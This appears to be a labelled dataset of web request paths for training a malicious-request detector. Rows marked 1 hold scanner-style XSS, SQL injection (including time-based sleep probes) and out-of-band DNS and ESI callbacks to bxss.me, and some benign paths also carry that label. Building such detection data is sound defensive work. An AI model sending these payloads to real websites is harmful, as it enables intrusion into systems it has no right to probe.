request	label
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(6509)"">?_=1630312351836"	1
/****/20210204/e115872866.html	0
/****/xqdt/byq/201802/t20180227_100565.html	0
/****/fkxxfy/202109/t20210917_186709.html	0
/**********/system/2020/02/04/013071104.shtml	0
/**/system/2021/12/16/012230626.shtml	0
/****/xqldly/hfbyqz/202110/t20211026_195846.html	0
/******/uploadpic/image/20190603/1559545662651458.jpg	0
/******/hbdc/xg/	0
/***/0/01/45/21/1452122_787345.jpg	0
/******/system/2011/05/23/010371670.shtml	0
/**********/system/2020/12/31/013312651.shtml	0
/***/wxzcgk/202011/t20201124_2347012.html	0
/***/800/10/87/32/10873219_948757.jpg	1
/zwxx_11337/****/201909/t20190903_1716985.html	0
/*******/zwgk/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwxsb/	0
/**********/system/2021/11/13/javascript:window.print()	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/*****/fypt	0
/****/byszx/201611/t20161121_76519.html?leader='.gethostbyname(lc('hitdz'.'hrceevxs76832.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(68).chr(113).chr(86).'	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5929\u6d77\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/******/zcfg/index.shtml	0
/****/system/2016/11/10/javascript:window.close();	1
/***/0/01/75/54/1755483_290818.jpg	0
"/****/zzxxgk/tjj/?wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/****/zt/2017jgnb/xjzf/201802/p020180207402790979869.pdf	0
/zwxx_11337/****/202005/t20200528_2104723.html	0
/*********/file/twphp.cer	1
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/index_1.html	0
/zwxx_11337/****/zcjd/201912/t20191203_1869759.html	0
/****/czgk/bmjs/zzqfyxt/xxqrmfy/201805/t20180524_765670.html	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') and 4422=0276 and '1'='1&perpage=15&outlinepage=10	1
/***/mobile_h5/waparticledetail.do?article_id=201811191420251046&contenttype=article	0
/***/0/02/06/79/2067980_067711.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6052\u5229\u8fbe\u5efa\u6750\u90e8	0
/**********/system/2021/08/07/013431921.shtml	0
/*****/javascript/bxslider-4/jquery.bxslider.js	1
/**********/system/2021/12/18/javascript:window.print()	1
/****/gccb/xnygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/**/zwxmtjz/sj/wx_38894/201908/w020190822694774281745.jpg	0
/****/system/more/13628020000000000/0000/13628020000000000_00000004.shtml	0
/**/slash-cms/index.php?mod=sl_pages&id=alert(777)	1
/****/zfwjn/1088/1097/list.html?new=/xfs.bxss.me	1
/****/yqzt/mtjs/202011/t20201116_255988.html	0
/*******/zzsl/zfgzbg/	0
/******/tab-actbg2.png	0
/**********/system/2021/08/05/013430602.shtml	0
"/************/template/jcse/110105008056111/16/images'""""()&%<acx><script >uzie(9579)</script>/main.css"	1
/****/rsrm/201701/w020170728623044234413.jpg	0
/***********/image/about_img.jpg	1
/*****/system/2015/03/22/011666812.shtml	0
/****/bxss.me/t/xss.html?	1
/****/zzxxgk/tjj/zfxxgkml_if(now()=sysdate(),sleep(15),0)/hygq_2064/list.html	1
/**********/system/2021/10/02/013459999.shtml	0
/***/mobile_h5/waparticledetail.do?article_id=201901041707461130&contenttype=article	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%' or 0611=0019 and '%%'='%&wbfileid=51419	1
/*****/gy48/cpgyss.asp?key=\u9999\u70df\u70df\u96fe&l=\u027d\ufffd\ufffd	0
/**//xfs.bxss.me/css/page.css	1
/*/public/viewclick/?addclick=1&classid=-1); waitfor delay '0:0:8.394' -- &id=1285	1
/****/bwcx/dtbb/jtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?page=2&channelid=253477&searchword=1%' or 2101=2101 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/**********/system/2020/04/02/013130957.shtml	0
"/****/zfwjn/1088/1095/list.html?new="""".gethostbyname(lc(""""hitcf"""".""""tctoobmyab40c.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(112).chr(86).chr(112).chr(84)."""""	1
/**********/system/2020/09/23/013252502.shtml	0
"/****/'""""()&%<acx><script >ooae(9712)</script>/bmleft.html"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 7192=7192	1
/***/0/01/92/01/1920175_550867.jpg	0
/****/web/search?channelid=254846') and 4918=4211 and ('trvy'='trvy&searchword=ÃÏΩÚ	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' or 0876=1649 and '1'='1&wbfileid=51419	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u8bfa\u6167\u901a\u6559\u80b2\u4fe1\u606f\u54a8\u8be2\u4e2d\u5fc3	0
/*****/system/2021/02/22/javascript:window.close();	1
/****/system/2021/pic/202102/23/1fe8bee2-08a0-4846-8db3-1e2e21078649.jpg.1	0
/**/system/2021/08/05/012188946.shtml	0
/****/zfwjn/1088/1089/list.html?new=bxss.me/t/xss.html?	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrthvzlgbn0kdxrpawc ebtoq=&openid=ovl7jjpxho1acdx9slwkdrfw3er8&outer_str=6855&activate_ticket=fdzv9emqaffrnr3xboqhb1ixe6jjsbh4ccmymvsfevpoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi2 q4wqiiizhcpasp3vw15y=	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6dfc\u79be\u67b8\u675e\u52a0\u5de5\u5382	0
/******/usercenter/index?qrcode=quicklyrq,3,129627,10125779	0
/******/2.gif	0
/****/zgsdt/zgs16/201610/t20161013_103270.html	0
"/****/czgk/bmyjs/qtdw/aglyzhaggclhhy/\""javascript:void(0)\"""	1
/****/qzfwj/list_29.html	0
"/zwxx_11337/****/202112/"">"	0
/****/bmkx/ggjyzx/202008/t20200825_171474.html?	0
/******/system/2021/04/18/013370412.shtml	0
/***/0/01/76/75/1767510_957557.jpg	0
/*****/system/2021/12/15/javascript:window.print()	1
/****/jjgz/202012/w020201231598997497517.jpg	0
/*****/gy42/ljcpgyview.asp?id=29552292&l2=\ufffd\ufffd\u0778&l=\ufffd\u3dab	0
/****/web/search?page=1&channelid=222832&searchword=\u5434\u7389\u624d&keyword=\u5434\u7389\u624d&perpage=20&outlinepage=10	0
/****/system/2016/10/27/javascript:window.print()	1
/***/0/01/76/72/1767256_984444.png	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u540c\u4e30\u6587\u5316\u4f20\u5a92\u6709\u9650\u516c\u53f8	0
/******/business-area%' and 2*3*8=6*8 and 'p5h6'!='p5h6%/quotation-service/	1
/***/0/01/93/20/1932037_070398.jpg	0
/******/images/02.jpg	0
"/****/xqdt/hnx/202010/"""	0
/***/wp-admin/admin-ajax.php	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01b7&l=\u027d\ufffd\ufffd	0
"/**********/2021-0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z-04 .html"	1
/******/scy_gj_lwwxj_wggj_tup.jpg	0
/**********/system/2020/05/07/013156261.shtml	0
/**/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search	1
/******/system/2020/12/15/013302366.shtml	0
"/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new="""".gethostbyname(lc(""""hitjq"""".""""ajzunypkebe55.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(107).chr(76).chr(115).chr(68)."""""	1
"/**/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/******/dsjy/xk	0
/**********/system/2020/03/27/013126615.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u7f8e\u5bb9\u9662\u6240	0
/***/mobile_h5/waparticledetail.do?article_id=201912091020521051&contenttype=article	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5929\u9f99\u516c\u53f8\u8d3a\u5170\u53bf\u7acb\u5c97\u9547\u4f9b\u6c14\u7ad9	0
/****/20210331/9610.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u79c0\u840d\u6c34\u679c\u5e97	0
/******/resource/js/news%' and 2*3*8=6*8 and 'zdbz'!='zdbz%/newscontent.js	1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqtjj	0
/******/system/2016/12/05/javascript:void();	1
/****/202001/t20200102_1911954.html	0
/***/nbhd/opengovmsgbox.do?method=listgovmsgboxs&siteid=115&order=1&appid=4&pageindex=3&pagesize=10	0
"/************/template/"""" """"a"""".concat(70-3).concat(22*4).concat(110).concat(84).concat(122).concat(65) (require""""socket""""
socket.gethostbyname(""""hitvv"""" """"tkecydzod2611.bxss.me."""")[3].to_s) """"/110105008056111/16/images/plugin/voice/hzrecorder.js"	1
/***/images/03.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6c38\u8f89\u8d85\u5e02\u6709\u9650\u516c\u53f8\u94f6\u5ddd\u5eb7\u5e73\u8def\u5206\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9a6c\u6797\u7535\u710a\u52a0\u5de5\u90e8	0
/*****/gy48/cpgyss.asp?key=\u5efa\u7b51\u7b5b\u6c99\u673a\u8bbe\u8ba1\u56fe\u7247\u7ed3\u6784\u56fe\u548c\ufffd&l=\u027d\ufffd\ufffd	0
/******/download/down.jsp?i_id=23679&colid=72') and 3574=3574 and ('qflz'='qflz	1
/****/tzgg/201810/t20181017_1129603_zzb.html	0
/**/system/2021/11/23/012224716.shtml	0
/zwxx_11337/****/201707/t20170714_309764.html	0
/**********/system/2015/12/09/011883880.shtml	0
/****/djbn_jthd/202107/t20210723_312857.html	0
/if(now()=sysdate(),sleep(18),0)/**************/2017-02-16/221.html	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8584\u76c8\u5546\u884c	0
/******/qhkc/img4/8.png	0
/****/jwfj	0
/***/viewspace-741.html	0
"/***/getdetail?data={""news_id"":""1262166"",""diversion_id"":"""",""sign"":""""}"	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u706b\u7130\u70e4\u5427	0
/********/xxgk/zycwxx/qywh/xwzx/gjmt/ddjs/lxwm/gjcp/dgdz/	0
/**********/system/2021/09/28/013458205.shtml	0
/**********/system/2021/12/14/013494459.shtml	0
/****/bmkx/snmj/201809/t20180918_110077.html	0
/***/viewspace-567.html	0
/****/20200516/e101018395.html	0
/**********/system/2020/03/22/013121547.shtml	0
/****/202001/t20200119_1926304.html	0
/****/whhd/201704/t20170410_143754.html	0
/zwxx_11337/****/201804/t20180426_743892.html	0
/****/system/2019/12/30/javascript:window.print()	1
/**/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u5929\u548c\u5e7f\u544a\u4f20\u5a92\u4e2d\u5fc3	0
/******/xxsjd/rc/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u871c\u838e\u7a97\u5e18\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u535a\u536f\u6559\u80b2\u54a8\u8be2\u670d\u52a1\u90e8	0
"/zwxx_11337/*******/202006/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/system/2021/11/11/javascript:dozoom(14)	1
"/******/visitcount/visit.jsp?i_columnid=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&i_webid=1&type=1"	1
/**/system/count/0006013/000000000000/window.location.href	1
/****************/file/loadimage/?id=e1dcad6f-33c7-4538-9606-ef764fdfb0f7	0
/****/xxgkml/qtfdxx/dcjc/201912/t20191224_145761_wap.html	0
/****/system/2021/08/15/013434900.shtml	0
/***/0/10/85/79/10857945_735090.jpg	0
"/***/dsp_dp_showmonth.cfm? 5=posn 1&datelong="""">alert(777)"	1
/****/lhyj.htm	0
/***/0/01/37/68/1376898_716667.jpg	0
/**********/system/2020/10/28/013273255.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19108896748551582692_1640016863929	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5bc6\u5ba4	0
/******/resource/code/datainput.jsp?owner=%' and 5256=5256 and '%'='	1
/*******/202105/202105240917381021.html	0
/*****/img3/7a.jpg	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtegdg8u6onag pgcsl2xgmm=&openid=ovl7jjvrdmddlqxa6e71qczphxhg&outer_str=23889&activate_ticket=fdzv9emqaffrnr3xboqhb61k20suj4vg5pa9/caygothfifidrt1ejnprxbtx1zv0zox3zlx4rczcfb4xil0qpozkxflgzs5bt1i96ob5cw=	0
/******/public/2020/10/27/100127.images/v100127_b1603785978882.jpg	0
/**/zwxmtjz/sj/wb_38895/201908/w020190822694642097064.png	0
/****/zhengce/zfwjn/201801/t20180116_99292.html	0
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/***********/shangpinqihuo/nengyuanhuagong/2021-10-26/1979.html	0
"/****/system/2021/09/08/013447520'""""/>//</script//>//<svg/onload=alert(1510) width=100///>.shtml"	1
/****/wxj	0
/****/zpdt/index_117.html and 1=1	1
/****//xfs.bxss.me/fdzdgknr/qtfdxx/	1
/**********/spellcheck.do	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1463&h=915&treeid=1114&refer=&pagename=l2luzm8uannw&newsid=1295	0
/******/4.jpg	0
"/*****/abantecart/index.php?currency=""><script>alert(777);</script>&product_id=109""><script>alert(777);</script>&rt=product/product"	1
/*****/gy48/cpgyss.asp?key=\u03a6325\u4e09\u5411\u4f4d\u79fb&l=\ufffd\ufffd\ufffd\ufffd	0
"/****/czgk/bmjs/zzqfyxt/ldxrmfy/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/********/environment/wx_authorize?code=093klg0006ypzm1fp04002icf33klg07&state=61c01e1a763d7159417334&appid=wx4705810e91036e74	0
/****/bmkx/styj/202102/t20210203_177267.html	0
//***********/ui/lib/easyui/themes/bootstrap/linkbutton.css	1
/****/byyw/202003/t20200303_148683.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0778\ufffd\u02bd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3f6d	0
/***/gygj/jtgg/qywh/shzr/wzdt/ddjs/qtgz/xwzx/mtgz/2021_mtgz/202105/t20210505_273338.html	0
/******/resource/js/photoswipe/3.0.5.1/northwind/	1
/****/zgsdt/2021_qydt/202111/t20211111_320388.html	0
"/*****/fiyo/?app=article&view=item31ab2"""">alert(777)0ccba&id=186"	1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/bmkx/ygjt/201906/w020190617395499499992.jpg	0
/**********/system/2021/01/07/013316098.shtml	0
/****/20210817/n.src	0
/****/xqdt/hnx/201904/t20190430_118861.html	0
/*******/837817.html	0
/zwxx_11337/****/202108/t20210811_2970410_zzb.html	0
/*******/images/file1253017428157.jpg	0
/**********/system/2020/06/30/013195861_01.shtml	0
/****/search.jspx?q= ‰»Îπÿº¸◊÷</textarea>--><xss_c950df5288f502249702eb255ef62bee/><!--<textarea>	1
/****/zt/2019wznb/zzqbm/202001/p020200116642319487317.pdf	0
/*****/system/2020/01/14/javascript:void(0);	1
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqzfwdwzcyjs_1816/201702/t20170208_317874.html	0
/****/bmkx/sfgw/202105/w020210513377430345564.jpg	0
/**********/system/2016/02/06/011930914.shtml	0
/******/2.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery19105175192113287723_1640016402101	0
/****/system/2021/11/18/012223686.shtml	0
/****/xqldly/hfhnsj/202111/t20211101_196059.html	0
"/cgi-bin/*****/system.html?step=2&device=et""/><script>alert(777);</script>bh0"	1
/wp-content/*******/prism-highlight/css.php	1
/****/zzxxgk/bmmzj/xxgkml/ybjxwfbh/202112/t20211210_197629_wap.html	0
/******/resource%' and 2*3*8=6*8 and '8kec'!='8kec%/js/newcalendar/my97datepicker.htm	1
/****/gggs/201612/t20161223_84124_wap.html	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u7f18\u5473\u5bb6\u7802\u9505\u996d\u9986	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5357\u8857\u5f00\u5143\u65e5\u7528\u767e\u8d27\u5546\u5e97	0
/****/zt/hjbhdc/index.html	0
"/***/getsubject?data={""subject_id"":617,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":379399,""sign"":""""}"	0
/******/header_logo.jpg	0
/**********/system/2021/08/22/013438019.shtml	0
/***/?refresh=</script><script>window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()</script>	1
/****/xqdt/byq/201707/w020170703615730544095.jpg	0
"/****/gccb/wlgc//*/-->'""""></iframe></script></style></title></textarea><script >alert(58251)</script>"	1
/****/qzfwj/201809/t20180918_1055735.html	0
/****/system/2021/10/25/013469448.shtml	0
/*****/index_bszn_mxgr.html	0
"/****/cyryhmd.htm/""""><script>alert`01883`</script>"	1
/****/web/search?channelid=234439&orderby=relevance</script><script>alert`83507`</script>&perpage=24&searchword=1	1
/***********/shangpinqihuo/nongchanpin/2021-11-15/1997.html	0
"/************/template/jcse/110105008056111<esi:include src=""""http://bxss.me/rpb.png""""/>/16/images/jquery.waterfall.js"	1
/***/003/004/490/00300449078_4202708a.jpg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%') or 9301=9301	1
/****/system/2021/10/27/012212336.shtml	0
"/***/getdetail?data={""news_id"":""1263959"",""diversion_id"":"""",""sign"":""""}"	0
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/******/resource/js'||'/counter.js	1
"/***/getsubject?data={""subject_id"":529,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":377245,""sign"":""""}"	0
"/module'""""()&%<acx><script >gejm(9023)</script>/*****/grouppic/jquery.ad-gallery.js"	1
/****/wdsjs/hfswsj/202104/t20210430_181315_wap.html	0
/****/system/2013/02/01/011013529.shtml	0
/***/0/11/52/35/11523592_689231.jpg	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u897f\u5317\u996d\u5e84	0
/*******/qiye/b-e914570.html	0
/**********/system/2021/09/17/javascript:void(0);	1
/***/0/02/00/77/2007757_953126.jpg	0
/**/system/2019/02/16/011711839.shtml	0
/******/my97datepicker/my97datepicker.htm	0
/****/bmkx/sgsj/202101/w020210120619878982473.jpg	0
/****/czgk/bmyjs/rmtt/tw/201903/t20190305_1297848.html	0
/****/yd/	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u67ef\u739b\u517b\u751f\u4f1a\u6240	0
/****/2020_zdgz/202107/t20210723_312873.html	0
"/****/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror=""alert(777)""/>"	1
/****/2020wzqh/202011/t20201130_259605.html	0
/****/zgsdt/2021_qydt/202103/t20210331_272063.html	0
/******/if(now()=sysdate(),sleep(15),0)/1905151614057782.js	1
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=xianfeng°Ëtpage=1	0
/****/web/search?channelid=299868%' and 8539=8539	1
/***********/jinrongqihuo/guzhiqihuo' and 2*3*8=6*8 and 'w3ez'='w3ez/	1
/******/_content/download.jsp?owner=if(now()=sysdate(),sleep(12),0)&urltype=news.downloadattachurl&wbfileid=51452	1
/***/0/00/20/50/205067_895846.gif	0
/****/jtdt/2013jtdt/javascript:stranbody();	1
"/***/getsubject?data={""subject_id"":394,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":5806,""sign"":""""}"	0
/****/gfxwj/list_29.html	0
/****/bmkx/sjsj/202111/local.replace(	0
"/***/openemr/?site="""">alert(777);"	1
/****/web/search?page=31&channelid=222832&searchword=\u5218\u53ef\u4e3a&keyword=\u5218\u53ef\u4e3a&perpage=20&outlinepage=10	0
/****/system/2017/04/14/012286742.shtml	0
/*****/20170419/n.src	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7a7a\u6c14\u8d28\u91cf	0
"/****/' 'a'.concat(70-3).concat(22*4).concat(108).concat(78).concat(99).concat(79) (require'socket'
socket.gethostbyname('hitds' 'whdyamzq0c405.bxss.me.')[3].to_s) '/bmjs/gdyx/"	1
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=195&i_webid=1&type=2&url=if(now()=sysdate(),sleep(15),0)	1
/****/mtgz/2019_mtgz/202012/t20201215_264991.html and 1=1	1
/***********/zaojianpinglun/?_=1640026042016	0
/*****/gy48/ljcpgyview.asp?id=42869190&l=\u0328\ufffd\ufffd	0
/**/api/alert(777)	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5170\u5dde\u4f20\u7edf\u725b\u8089\u9762	0
/***********/zaojianpinglun/?_=1640008940404	0
/**********/system/2020/06/07/013179703.shtml	0
/*****/gy42/ljcpgyview.asp?id=28735414&l2=\ufffd\u0237\ufffd&l=\ufffd\u04f1\ufffd	0
/************/template/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt?.jpg/voice.css	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5b89\u683c\u6587\u5177\u5e97	0
/about-southwest/organizational-institution/**/skin/wdatepicker.css	0
/****/businesses-e19740_39.html?category_id	0
/****/1qdg4l-article-e117150222.html	0
"/***/getlist?data={""channel_id"":""12214"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/***/interface/comul_total.json.jsp?callback=jquery1910443821336450553_1639972996001	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u7ef4\u5f6c\u6253\u5b57\u590d\u5370\u90e8	0
/******/system/2017/06/14/012334614.shtml	0
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search	1
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search	1
/*****/pp/	0
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/web/search?channelid=299868&perpage=1000) and 2954=5470#	1
/**********/system/more/223000000000000/0008/223000000000000_00000848.shtml	0
/**********/system/2020/09/04/013240137.shtml	0
/****/1583/33787.htm	0
/**/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php	1
/****/dxzdj/images/p020141127378266945222.jpg	0
/**********/system/2021/10/22/javascript:window.close();	1
/****/2020jnxc/yxzp/202006/w020200701492467657122.jpg	0
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10063253	0
/zwxx_11337/****/201604/t20160407_310563.html	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\u07fb\ufffd&l2=\ufffd\u5dee&l=\ufffd\ufffd\ufffd\ufffd	0
/******/2018index/toplistbg.png	0
/****/xxgkml/qtfdxx/yjyayjxx/202107/t20210723_184909_wap.html	0
/****/xqdt/byq/201707/w020170711597606581994.jpg	0
/****/ccp/zwhd/202111/t20211116_3130146.html	0
/************/search.do?category=1&cateid=40&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=«Î ‰»Îπÿº¸¥ &tpl=16&websiteid=110105008056111	1
